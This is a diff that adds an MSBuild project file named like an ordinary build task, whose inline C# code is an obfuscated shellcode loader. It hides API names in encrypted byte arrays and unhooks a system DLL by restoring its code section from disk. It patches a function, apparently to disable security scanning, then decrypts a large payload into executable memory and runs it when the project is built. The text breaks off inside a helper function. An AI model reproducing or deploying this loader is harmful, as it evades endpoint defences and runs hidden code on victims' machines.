@@ -1,0 +1,584 @@
+
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	  <Target Name="Forest">
+	    <ClassExample />
+	  </Target>
+	  <UsingTask
+	    TaskName="ClassExample"
+	    TaskFactory="CodeTaskFactory"
+	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	    <Task>
+	      <Code Type="Class" Language="cs">
+	      <![CDATA[
+        using System;
+        using System.IO;
+        using System.Diagnostics;
+        using System.Runtime.InteropServices;
+        using System.Security.Cryptography;
+        using System.Text;
+		using Microsoft.Build.Framework;
+		using Microsoft.Build.Utilities;
+		public class ClassExample :  Task, ITask
+        {
+
+            [StructLayout(LayoutKind.Sequential)]
+            public struct IMAGE_DATA_DIRECTORY
+            {
+                public UInt32 VirtualAddress;
+                public UInt32 Size;
+            }
+            [StructLayout(LayoutKind.Explicit)]
+            public struct IMAGE_OPTIONAL_HEADER64
+            {
+                [FieldOffset(0)]
+                public ushort Magic;
+
+                [FieldOffset(2)]
+                public byte MajorLinkerVersion;
+
+                [FieldOffset(3)]
+                public byte MinorLinkerVersion;
+
+                [FieldOffset(4)]
+                public uint SizeOfCode;
+
+                [FieldOffset(8)]
+                public uint SizeOfInitializedData;
+
+                [FieldOffset(12)]
+                public uint SizeOfUninitializedData;
+
+                [FieldOffset(16)]
+                public uint AddressOfEntryPoint;
+
+                [FieldOffset(20)]
+                public uint BaseOfCode;
+
+                [FieldOffset(24)]
+                public ulong ImageBase;
+
+                [FieldOffset(32)]
+                public uint SectionAlignment;
+
+                [FieldOffset(36)]
+                public uint FileAlignment;
+
+                [FieldOffset(40)]
+                public ushort MajorOperatingSystemVersion;
+
+                [FieldOffset(42)]
+                public ushort MinorOperatingSystemVersion;
+
+                [FieldOffset(44)]
+                public ushort MajorImageVersion;
+
+                [FieldOffset(46)]
+                public ushort MinorImageVersion;
+
+                [FieldOffset(48)]
+                public ushort MajorSubsystemVersion;
+
+                [FieldOffset(50)]
+                public ushort MinorSubsystemVersion;
+
+                [FieldOffset(52)]
+                public uint Win32VersionValue;
+
+                [FieldOffset(56)]
+                public uint SizeOfImage;
+
+                [FieldOffset(60)]
+                public uint SizeOfHeaders;
+
+                [FieldOffset(64)]
+                public uint CheckSum;
+
+                [FieldOffset(68)]
+                public ushort Subsystem;
+
+                [FieldOffset(70)]
+                public ushort DllCharacteristics;
+
+                [FieldOffset(72)]
+                public ulong SizeOfStackReserve;
+
+                [FieldOffset(80)]
+                public ulong SizeOfStackCommit;
+
+                [FieldOffset(88)]
+                public ulong SizeOfHeapReserve;
+
+                [FieldOffset(96)]
+                public ulong SizeOfHeapCommit;
+
+                [FieldOffset(104)]
+                public uint LoaderFlags;
+
+                [FieldOffset(108)]
+                public uint NumberOfRvaAndSizes;
+
+                [FieldOffset(112)]
+                public IMAGE_DATA_DIRECTORY ExportTable;
+
+                [FieldOffset(120)]
+                public IMAGE_DATA_DIRECTORY ImportTable;
+
+                [FieldOffset(128)]
+                public IMAGE_DATA_DIRECTORY ResourceTable;
+
+                [FieldOffset(136)]
+                public IMAGE_DATA_DIRECTORY ExceptionTable;
+
+                [FieldOffset(144)]
+                public IMAGE_DATA_DIRECTORY CertificateTable;
+
+                [FieldOffset(152)]
+                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
+
+                [FieldOffset(160)]
+                public IMAGE_DATA_DIRECTORY Debug;
+
+                [FieldOffset(168)]
+                public IMAGE_DATA_DIRECTORY Architecture;
+
+                [FieldOffset(176)]
+                public IMAGE_DATA_DIRECTORY GlobalPtr;
+
+                [FieldOffset(184)]
+                public IMAGE_DATA_DIRECTORY TLSTable;
+
+                [FieldOffset(192)]
+                public IMAGE_DATA_DIRECTORY LoadConfigTable;
+
+                [FieldOffset(200)]
+                public IMAGE_DATA_DIRECTORY BoundImport;
+
+                [FieldOffset(208)]
+                public IMAGE_DATA_DIRECTORY IAT;
+
+                [FieldOffset(216)]
+                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
+
+                [FieldOffset(224)]
+                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
+
+                [FieldOffset(232)]
+                public IMAGE_DATA_DIRECTORY Reserved;
+            }
+            [StructLayout(LayoutKind.Explicit, Size = 20)]
+            public struct IMAGE_FILE_HEADER
+            {
+                [FieldOffset(0)]
+                public UInt16 Machine;
+                [FieldOffset(2)]
+                public UInt16 NumberOfSections; //keep
+                [FieldOffset(4)]
+                public UInt32 TimeDateStamp;
+                [FieldOffset(8)]
+                public UInt32 PointerToSymbolTable;
+                [FieldOffset(12)]
+                public UInt32 NumberOfSymbols;
+                [FieldOffset(16)]
+                public UInt16 SizeOfOptionalHeader;
+                [FieldOffset(18)]
+                public UInt16 Characteristics;
+            }
+            [StructLayout(LayoutKind.Sequential)]
+            public struct IMAGE_DOS_HEADER
+            {
+                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+                public char[] e_magic;
+                public UInt16 e_cblp; 
+                public UInt16 e_cp; 
+                public UInt16 e_crlc; 
+                public UInt16 e_cparhdr;
+                public UInt16 e_minalloc; 
+                public UInt16 e_maxalloc;
+                public UInt16 e_ss; 
+                public UInt16 e_sp; 
+                public UInt16 e_csum; 
+                public UInt16 e_ip; 
+                public UInt16 e_cs; 
+                public UInt16 e_lfarlc; 
+                public UInt16 e_ovno; 
+                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+                public UInt16[] e_res1; 
+                public UInt16 e_oemid; 
+                public UInt16 e_oeminfo; 
+                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
+                public UInt16[] e_res2;
+                public Int32 e_lfanew;  
+
+                private string _e_magic
+                {
+                    get { return new string(e_magic); }
+                }
+
+                public bool isValid
+                {
+                    get { return _e_magic == "MZ"; }
+                }
+            }
+            [StructLayout(LayoutKind.Explicit)]
+            public struct IMAGE_NT_HEADERS64
+            {
+                [FieldOffset(0)]
+                public int Signature;
+
+                [FieldOffset(4)]
+                public IMAGE_FILE_HEADER FileHeader;
+
+                [FieldOffset(24)]
+                public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
+            }
+            [StructLayout(LayoutKind.Sequential)]
+            public struct MODULEINFO
+            {
+                public IntPtr lpBaseOfDll;
+                public uint SizeOfImage;
+                public IntPtr EntryPoint;
+            }
+            [StructLayout(LayoutKind.Explicit)]
+            public struct IMAGE_SECTION_HEADER
+            {
+                [FieldOffset(0)]
+                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+                public char[] Name;
+
+                [FieldOffset(8)]
+                public UInt32 VirtualSize;
+
+                [FieldOffset(12)]
+                public UInt32 VirtualAddress;
+
+                [FieldOffset(16)]
+                public UInt32 SizeOfRawData;
+
+                [FieldOffset(20)]
+                public UInt32 PointerToRawData;
+
+                [FieldOffset(24)]
+                public UInt32 PointerToRelocations;
+
+                [FieldOffset(28)]
+                public UInt32 PointerToLinenumbers;
+
+                [FieldOffset(32)]
+                public UInt16 NumberOfRelocations;
+
+                [FieldOffset(34)]
+                public UInt16 NumberOfLinenumbers;
+
+                [FieldOffset(36)]
+                public uint Characteristics;
+
+                public string Section
+                {
+                    get { return new string(Name); }
+                }
+            }  
+
+            [DllImport("kernel32")]
+            public static extern IntPtr LoadLibrary(string name);
+            
+            [DllImport("kernel32")]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+            public delegate bool clsh
+            (IntPtr hObject);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool frlb
+            (IntPtr hModule);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr mpvfl
+            (IntPtr hFileMappingObject, uint dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);
+
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
+            public delegate IntPtr crtflmp
+            (IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall,  SetLastError = true)]
+            public delegate IntPtr crtfla
+            (string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall,  SetLastError = true)]
+            public delegate bool getmodinf
+            (IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate IntPtr getmodh
+            (string lpModuleName);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr getprc
+            ();
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr mvmem
+            (IntPtr dest, IntPtr src, UInt32 count);
+
+            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+            public delegate IntPtr vproc
+            (IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr mvmem2
+            (IntPtr dest, IntPtr src, int size);
+
+            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+            public delegate IntPtr vproc2
+            (IntPtr lpAddress, uint dwSize,
+                    uint flNewProtect, IntPtr lpflOldProtect);
+                    
+            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    	    public delegate IntPtr weyukgztgs(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    	    
+    	    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    	    public delegate UInt32 bicxnslxme(IntPtr hHandle,UInt32 dwMilliseconds);
+    	    
+    	    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    	    public delegate IntPtr cizffnuaki(UInt32 lpThreadAttributes,UInt32 dwStackSize,IntPtr lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
+    	private static UInt32 MEM_COMMIT = 0x1000;
+    	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+    	    delegate UInt32 uizfdvjlsa();
+
+            public override bool Execute()
+            {
+            
+          	byte[] yecfespkcd = {0xe6,0xa9,0x4c,0xa7,0x13,0x53,0x37,0x6d,0x26,0xab,0x54,0xef,0x3f,0x42,0xaa,0x4d};
+	    string ctfjqwsqna = oikbpwhwki(yecfespkcd);	
+
+            byte[] xyeuuhhbnh = {0xfb,0xe4,0x9c,0x4a,0x44,0xd7,0x57,0xa7,0x58,0xb5,0x8c,0x99,0x69,0xa1,0x0a,0x35};
+	    string sifctlrupq = oikbpwhwki(xyeuuhhbnh);
+	    
+	    byte[] qafwzaedmd = {0xef,0x6f,0x57,0x7a,0x14,0xab,0x4c,0x7d,0xcf,0xc7,0xa9,0x4a,0xf2,0x1a,0xf6,0x12};
+	    string qczzetehin = oikbpwhwki(qafwzaedmd);
+	    
+	    byte[] fjidpsjrdt = {0xe5,0x26,0x79,0xee,0x29,0xbf,0x1f,0x76,0x93,0x4a,0x47,0x2a,0xa9,0x3d,0x4f,0x74};
+	    string uogxprhyvp = oikbpwhwki(fjidpsjrdt);
+	    
+	    byte[] mtcjtquaie = {0x88,0xce,0x54,0x3b,0xa5,0xe6,0x3e,0xb7,0xc0,0xa4,0xa2,0xfb,0xb1,0xde,0x07,0x22};
+	    string wfxxtttuqw = oikbpwhwki(mtcjtquaie);
+	    
+	    byte[] wlbuoyquad = {0x77,0x82,0x50,0xf8,0x53,0x87,0x3c,0x9b,0xe2,0xbd,0x0e,0x2c,0x0e,0x18,0xeb,0xde};
+	    string uvmwwleflx = oikbpwhwki(wlbuoyquad);
+	    
+	    byte[] kooskdxepz = {0x31,0xf7,0x34,0x54,0xdd,0xea,0x51,0xc4,0xed,0xf3,0x30,0xdb,0xd0,0x7a,0xba,0xdb};
+	    string oqcvxwlpsz = oikbpwhwki(kooskdxepz);
+	    
+	    byte[] xyctnmgacw = {0x41,0x53,0xdd,0x38,0x16,0x09,0xb1,0x01,0xd0,0xaa,0x9e,0x01,0xf3,0x15,0x50,0x83,0xad,0xbd,0x6e,0x6f,0xe8,0xa8,0x66,0x01,0x1a,0x68,0x81,0x41,0x4f,0xd2,0xf2,0xaf};
+	    string lnxrfiqxsh = oikbpwhwki(xyctnmgacw);
+	    
+	    byte[] oykaxorqrt = {0xe6,0x1f,0xbc,0x29,0x6e,0x48,0x24,0xc1,0x87,0x21,0x19,0x91,0x14,0x2e,0x8c,0x5e,0xf1,0x72,0x1d,0x9f,0xf2,0x64,0x01,0xba,0xd9,0x66,0x13,0x36,0x25,0x34,0x9b,0xe3};
+	    string mrknqcdkzk = oikbpwhwki(oykaxorqrt);
+	    
+	    byte[] hanpbuiiyp = {0x7c,0x52,0x47,0x6a,0x46,0x4d,0xff,0xe2,0xb8,0x4e,0xbf,0xc5,0x2a,0xf5,0x27,0x1b,0x01,0x15,0x22,0x8f,0xfb,0x01,0xeb,0x25,0x4a,0x89,0xb4,0xc3,0xa6,0xdc,0xec,0x1b};
+	    string lgdqaccnqw = oikbpwhwki(hanpbuiiyp);
+	    
+	    byte[] ezdxneaatz = {0x31,0x44,0xaf,0x4a,0xb7,0x24,0x57,0xd4,0x93,0x06,0x10,0x8e,0x18,0x83,0x58,0x7d};
+	    string mhjttttgqq = oikbpwhwki(ezdxneaatz);
+	    
+	    byte[] xmyrxaudyy = {0x2b,0xfc,0x0d,0x80,0x01,0x54,0x1b,0xee,0x29,0x80,0x1f,0x4e,0x17,0x5d,0xf5,0xa9,0x29,0x69,0x34,0xaa,0xaf,0xbb,0x21,0x9d,0x6e,0x49,0xe0,0x15,0xa5,0xce,0x18,0xfc};
+	    string wsqbhvkoep = oikbpwhwki(xmyrxaudyy);
+	    
+	    byte[] wlkmwmuyix = {0xeb,0x91,0xcb,0x9b,0x19,0xde,0x7d,0x15,0xb7,0xac,0x9b,0xdf,0x22,0xa5,0xfc,0x67};
+	    string tfoemmugvx = oikbpwhwki(wlkmwmuyix);
+	    
+	    byte[] skcfxyanuc = {0xc0,0xa8,0x4c,0xba,0x5c,0x8f,0x4d,0x4b,0x58,0x94,0x8e,0x7f,0xbe,0xc9,0x5a,0xf7};
+	    string rccbbanice = oikbpwhwki(skcfxyanuc);
+	    
+	    byte[] tqvfiwnszu = {0xb8,0x92,0x9a,0x33,0xd6,0x87,0x6f,0xee,0x76,0xff,0x71,0x01,0xa1,0xd1,0x85,0xbb};
+	    string jxeuofvtle = oikbpwhwki(tqvfiwnszu);
+	    
+	   byte[] dyiufcwkfq = {0xbe,0x84,0x84,0xa0,0x34,0xb1,0x66,0x91,0x31,0x24,0x7f,0x84,0x94,0xf3,0xfb,0x11,0x5b,0x7c,0x2e,0xb5,0x0c,0x21,0xb4,0x98,0xbb,0x22,0x8f,0x27,0xcb,0xc2,0x26,0xa9,0x82,0xa9,0x48,0xe1,0xee,0xcc,0xe0,0x78,0x03,0xe8,0x81,0x2b,0xc1,0xfa,0xe5,0xba};
+	    string hThread = oikbpwhwki(dyiufcwkfq);
+	    
+            IntPtr TargetDLL = LoadLibrary(qczzetehin);
+            IntPtr smvrlpnqoy = GetProcAddress(TargetDLL, uogxprhyvp);
+            IntPtr ktqwzfajna = Marshal.AllocHGlobal(4);
+            
+            IntPtr jguzumouds = getPtr(wfxxtttuqw, ctfjqwsqna);
+            vproc vp = (vproc)Marshal.GetDelegateForFunctionPointer(jguzumouds, typeof(vproc));
+
+            IntPtr dgjbjoocvl = getPtr(wfxxtttuqw, sifctlrupq);
+            mvmem mm = (mvmem)Marshal.GetDelegateForFunctionPointer(dgjbjoocvl, typeof(mvmem));
+
+            IntPtr ywpnvjvjyf = getPtr(wfxxtttuqw, ctfjqwsqna);
+            vproc2 vp2 = (vproc2)Marshal.GetDelegateForFunctionPointer(ywpnvjvjyf, typeof(vproc2));
+            
+            IntPtr dyiodusxyg = getPtr(wfxxtttuqw, sifctlrupq);
+            mvmem2 mm2 = (mvmem2)Marshal.GetDelegateForFunctionPointer(dyiodusxyg, typeof(mvmem2));
+            
+            IntPtr clrfxcijfj = getPtr(wfxxtttuqw, lnxrfiqxsh);
+            getprc gtp = (getprc)Marshal.GetDelegateForFunctionPointer(clrfxcijfj, typeof(getprc));
+            
+            IntPtr xfcymwnguo = getPtr(wfxxtttuqw, mrknqcdkzk);
+            getmodh gtmh = (getmodh)Marshal.GetDelegateForFunctionPointer(xfcymwnguo, typeof(getmodh));
+            
+            IntPtr xwfzafpoqj = getPtr(oqcvxwlpsz, lgdqaccnqw);
+            getmodinf gtmi = (getmodinf)Marshal.GetDelegateForFunctionPointer(xwfzafpoqj, typeof(getmodinf));
+            
+            IntPtr bcosmzmsfz = getPtr(wfxxtttuqw, mhjttttgqq);
+            crtfla crtfl = (crtfla)Marshal.GetDelegateForFunctionPointer(bcosmzmsfz, typeof(crtfla));
+            
+            IntPtr jujdipvcqk = getPtr(wfxxtttuqw, wsqbhvkoep);
+            crtflmp crtflm = (crtflmp)Marshal.GetDelegateForFunctionPointer(jujdipvcqk, typeof(crtflmp));
+            
+            IntPtr wvsnegkyuj = getPtr(wfxxtttuqw, tfoemmugvx);
+            mpvfl mp = (mpvfl)Marshal.GetDelegateForFunctionPointer(wvsnegkyuj, typeof(mpvfl));
+            
+            IntPtr cbhoqgtbfz = getPtr(wfxxtttuqw, rccbbanice);
+            frlb frl = (frlb)Marshal.GetDelegateForFunctionPointer(cbhoqgtbfz, typeof(frlb));
+            
+            IntPtr todbnmfaqp = getPtr(wfxxtttuqw, jxeuofvtle);
+            clsh cls = (clsh)Marshal.GetDelegateForFunctionPointer(todbnmfaqp, typeof(clsh));            
+            
+            ////////////////// UNHOOK
+                IntPtr curProc = gtp();
+                MODULEINFO modInfo;
+                IntPtr handle = gtmh(uvmwwleflx);
+                gtmi(curProc, handle, out modInfo, 0x18);
+                IntPtr dllBase = modInfo.lpBaseOfDll;
+                string fileName = hThread;
+                IntPtr file = crtfl(fileName, 0x80000000, 0x00000001, IntPtr.Zero, 3, 0, IntPtr.Zero);
+                IntPtr mapping = crtflm(file, IntPtr.Zero, 0x02 | 0x1000000, 0, 0, null);
+                IntPtr mappedFile = mp(mapping, 0x0004, 0, 0, IntPtr.Zero);
+
+                IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));
+                IntPtr ptrToNt = (dllBase + dosHeader.e_lfanew);
+                IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrToNt, typeof(IMAGE_NT_HEADERS64));
+                for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
+                {
+                    IntPtr ptrSectionHeader = (ptrToNt + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
+                    IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((ptrSectionHeader + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))), typeof(IMAGE_SECTION_HEADER));
+                    string sectionName = new string(sectionHeader.Name);
+
+                    if (sectionName.Contains("text"))
+                    {
+                        uint oldProtect = 0;
+                        IntPtr lpAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress);
+                        IntPtr srcAddress = IntPtr.Add(mappedFile, (int)sectionHeader.VirtualAddress);
+                        vp(lpAddress, sectionHeader.VirtualSize, 0x40, out oldProtect);
+                        mm(lpAddress, srcAddress, sectionHeader.VirtualSize);
+                    }
+                }
+
+
+                cls(curProc);
+                cls(file);
+                cls(mapping);
+                frl(handle);
+            //////////////// END UNHOOK
+      
+	    //////////////// PATCH
+            vp2(smvrlpnqoy, 0x0015, 0x40, ktqwzfajna);
+            
+            Byte[] xPatch = { 0x50, 0x8c, 0xf6 };
+            var xkey = "asfgkqpaldjdjhs";
+            byte[] Patch = XORCipher(xPatch, xkey);
+            
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+            mm2(smvrlpnqoy+ 0x001b, unmanagedPointer, Patch.Length);
+            ///////////////// END PATCH
+            
+            ///////////////// RUNNER
+            
+            		byte[] rtjztxxjfj = {0xed,0x3f,0xc7,0x06,0x5a,0x8d,0x95,0xfd,0x17,0x52,0x7f,0xd5,0xb2,0xb4,0xb2,0x72};
+        	string weyukgztgs = oikbpwhwki(rtjztxxjfj);
+        	
+                        IntPtr xugqgzzfgx = getPtr(wfxxtttuqw, weyukgztgs);
+            weyukgztgs va = (weyukgztgs)Marshal.GetDelegateForFunctionPointer(xugqgzzfgx, typeof(weyukgztgs));
+
+		byte[] gnnhkiongw = {0xfa,0xbb,0x47,0xcd,0xbe,0xed,0x59,0xbf,0x77,0xb1,0x2b,0xc5,0x1f,0xf9,0xa0,0x30,0xf9,0x8d,0xd3,0x5a,0x1e,0x0c,0x5a,0xe7,0xac,0x22,0xc9,0xd2,0x2f,0x66,0x51,0xea};
+        	string bicxnslxme = oikbpwhwki(gnnhkiongw);
+
+            IntPtr zutwhkoyhr = getPtr(wfxxtttuqw, bicxnslxme);
+        	bicxnslxme wfso = (bicxnslxme)Marshal.GetDelegateForFunctionPointer(zutwhkoyhr, typeof(bicxnslxme));
+
+		byte[] kqkwnoyita = {0xda,0x72,0x72,0xc6,0x90,0x04,0x04,0x17,0x9d,0x97,0x07,0x92,0x2a,0x18,0xdd,0x32};
+        	string cizffnuaki = oikbpwhwki(kqkwnoyita);
+
+            IntPtr xwtmonymlk = getPtr(wfxxtttuqw, cizffnuaki);
+            cizffnuaki ct = (cizffnuaki)Marshal.GetDelegateForFunctionPointer(xwtmonymlk, typeof(cizffnuaki));
+
+
+        	byte[] mgliuvpeeu = {0xdd,0x0b,0x0e,0x61,0x5e,0x4e,0x2d,0x05,0xbc,0x7f,0xd2,0xe1,0x48,0x48,0x40,0xef,0x18,0x23,0xba,0x43,0x47,0xb0,0xd2,0xd7,0xb3,0x3d,0x37,0x83,0xa8,0x09,0x43,0xf3,0xb7,0xff,0xae,0xe5,0xb0,0xb8,0x1d,0xa4,0xf7,0xa4,0x25,0x0e,0x76,0x52,0xe3,0x55,0xf1,0x98,0x21,0x24,0x84,0x33,0x37,0x54,0xb9,0x6b,0x9f,0xe7,0xb1,0x50,0x59,0x5a,0x51,0x8f,0x4a,0xda,0xad,0x7a,0x40,0x4f,0x62,0x17,0x56,0x6b,0x7a,0xaa,0xbd,0xbb,0xc1,0x3c,0x09,0x8b,0x9f,0x9a,0xa6,0x80,0xa1,0xe2,0xe0,0x30,0xe1,0xf0,0xc5,0xa0,0xdf,0xab,0xe5,0xb6,0x63,0x65,0x81,0x3f,0xfd,0xce,0x69,0x14,0x13,0x18,0x74,0xe1,0x72,0xda,0xf0,0x57,0xce,0xd1,0x6f,0x64,0xd6,0x76,0x1a,0x3f,0x80,0xb0,0x17,0x0a,0x66,0x8b,0x54,0x1b,0x8a,0x44,0x92,0xab,0xfe,0xf3,0x18,0xa4,0x42,0x94,0xa2,0x59,0xd9,0x86,0x7b,0xee,0x49,0x88,0x37,0x17,0xe3,0x6d,0x6d,0x6c,0x40,0xd5,0x52,0x67,0x3e,0x88,0xb9,0xfc,0x8c,0x93,0x37,0x01,0xbe,0xb1,0xb7,0x8b,0x0f,0xde,0xf5,0xcb,0x7b,0xf9,0x58,0xf8,0x78,0x5e,0xb0,0xbe,0xbe,0xaf,0x7c,0x5d,0x08,0xbc,0xa0,0x40,0xb2,0xe1,0x62,0x9d,0x3e,0x59,0xa9,0xe7,0x25,0x71,0x01,0xc6,0x53,0x9f,0xc2,0xa2,0xa3,0x6c,0x48,0xa5,0xd9,0x28,0xb1,0xdb,0x60,0xb0,0x75,0x00,0xff,0xf8,0x72,0xfb,0x3d,0x4d,0x36,0x5e,0xb8,0x8e,0x45,0xfe,0x65,0x21,0xea,0xea,0x07,0x3f,0xfa,0x79,0xdd,0x9a,0xb8,0x89,0x8c,0x6f,0x01,0xa0,0x35,0xb0,0x5c,0xec,0xa3,0x0a,0x09,0xcc,0x31,0x8c,0xbc,0x1c,0x11,0x4b,0x1f,0x54,0x03,0xe2,0x25,0xf5,0xa5,0x67,0x82,0xf9,0x04,0x69,0x11,0x62,0xda,0x19,0x57,0xab,0x65,0x5c,0x75,0x57,0x4b,0x06,0xea,0xc0,0xd2,0xf6,0xe4,0x88,0xae,0x08,0x30,0x3f,0x91,0xc7,0x1e,0xf6,0x4a,0x40,0xd6,0x54,0x1b,0x8e,0x4d,0x21,0x40,0x4e,0x5c,0x64,0xf8,0xae,0x0e,0xd9,0x03,0x69,0xf7,0x7c,0xad,0x63,0x54,0x8f,0x89,0xf0,0x79,0xfb,0x61,0xd1,0x72,0x44,0xbd,0xfe,0xcc,0x05,0x96,0x9f,0xa1,0x3a,0x41,0xc0,0xe4,0xae,0xf5,0xf5,0xb6,0xf8,0xc2,0xf4,0x3e,0xc5,0x8d,0xf4,0x81,0xc3,0xea,0xe0,0x90,0x30,0x93,0xcf,0x9d,0xa2,0x39,0xbc,0x5d,0xea,0x65,0x5b,0x22,0xca,0x34,0xd1,0xd2,0x5c,0x90,0xd0,0x39,0x24,0x31,0xff,0x8b,0x64,0x0f,0xfe,0xcd,0x22,0x31,0x96,0xe0,0xac,0xf7,0x9e,0xeb,0x72,0x4c,0x7b,0x95,0xb6,0x4a,0x7e,0x9e,0xdd,0xb0,0x44,0x39,0xd8,0x88,0x00,0xf8,0xb6,0x2c,0xa3,0xa0,0xfd,0x34,0x20,0xfc,0x11,0xc2,0xdd,0x2e,0xa9,0x1d,0x1b,0xb4,0xb3,0xfe,0x94,0xee,0xf2,0x9e,0x7d,0x4e,0xdf,0x74,0x47,0x7c,0xb1,0x15,0x6a,0xf9,0x1f,0x18,0x74,0xac,0xd0,0xbc,0x5b,0x45,0x09,0xb1,0x13,0xbb,0x1f,0x8d,0x9d,0x69,0x18,0x24,0xa4,0x75,0x05,0xee,0x3f,0xe5,0x47,0xe8,0xf0,0x9c,0x2d,0x10,0xaa,0x15,0x4d,0x16,0xfd,0xba,0x9c,0x3d,0xad,0xdc,0x30,0x78,0xfb,0x4d,0x47,0x24,0xe0,0x2e,0x19,0x46,0xb8,0x88,0x1d,0x9f,0x3d,0x88,0xdb,0xac,0xac,0xee,0x4f,0x95,0x17,0xa1,0x3e,0xc4,0x77,0xa1,0x91,0x8b,0x94,0x08,0xcd,0x37,0xba,0xbc,0xc7,0xa3,0x57,0x81,0x33,0xb0,0x09,0x85,0xc8,0xb5,0x8d,0x5e,0x4d,0x7f,0x03,0x16,0xed,0xf1,0x8a,0xd7,0xa8,0xd3,0xf7,0xea,0x79,0x78,0x5a,0x6b,0x21,0x01,0x91,0x21,0x20,0x85,0x0e,0xaa,0xb4,0xc9,0x1f,0x6d,0xee,0xf0,0xb3,0xa9,0x65,0x46,0x68,0x19,0x87,0x70,0x22,0xbe,0xc5,0x85,0x7e,0xf6,0xcf,0xd8,0xab,0x00,0xcb,0x6a,0x6a,0x42,0xe3,0x1f,0x3b,0x33,0xc3,0xdf,0xba,0x47,0x8f,0xab,0x07,0x8b,0xdb,0x04,0xdd,0x9b,0x7f,0x71,0x08,0x09,0x37,0xbd,0x3d,0x1b,0xd6,0xdd,0x53,0x6d,0xc3,0xf7,0xa3,0x32,0x78,0xad,0x9d,0x76,0x11,0xfc,0x5e,0x28,0x66,0x8a,0x7b,0x4d,0xe9,0x5a,0x2c,0x36,0x15,0x39,0xf6,0x51,0x85,0x74,0xc9,0x51,0x9f,0x0d,0x2d,0xd3,0x90,0x70,0x7c,0xb9,0xbb,0x93,0xe6,0xed,0x53,0xcd,0xa7,0x7c,0x84,0xb6,0x63,0xb7,0x09,0x2f,0x25,0x5d,0xe5,0x97,0xd7,0xe2,0x88,0x92,0x50,0x1c,0x3e,0xed,0xd2,0x2a,0x03,0x84,0xc9,0x17,0x6c,0x67,0xa0,0x97,0xab,0xdc,0x56,0x83,0xd0};
+
+        	byte[] wpwsyvvacf = ioaliexatl(mgliuvpeeu);
+
+
+		IntPtr uxpcgaxxsr = va(0, (UInt32)wpwsyvvacf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        	Marshal.Copy(wpwsyvvacf, 0, (IntPtr) uxpcgaxxsr, wpwsyvvacf.Length);
+            uizfdvjlsa psomhjdhqn = (uizfdvjlsa)Marshal.GetDelegateForFunctionPointer((IntPtr) uxpcgaxxsr, typeof(uizfdvjlsa));
+                
+            psomhjdhqn();
+
+        	////////////////////// END RUNNER
+
+            return true;
+        }
+                static IntPtr getPtr(string dllName, string funcName)
+            {
+
+                IntPtr hModule = LoadLibrary(dllName);
+                IntPtr Ptr = GetProcAddress(hModule, funcName);
+                return Ptr;
+
+            }
+        
+                static byte[] XORCipher(byte[] xpatch, string xkey)
+        {
+            int patchLen = xpatch.Length;
+            int xkeyLen = xkey.Length;
+            byte[] output = new byte[patchLen];
+
+            for (int i = 0; i < patchLen; ++i)
+            {
+                output[i] = (byte)(xpatch[i] ^ xkey[i]);
+            }
+
+            return output;
+        }
+        static byte[] ioaliexatl(byte[] anzbldzbrg)
+    {
+        byte[] izejhbvitq = {0x30,0xf8,0x51,0x99,0xc0,0x55,0xc7,0x16,0x02,0x43,0x28,0x84,0xee,0x58,0xa9,0x04};
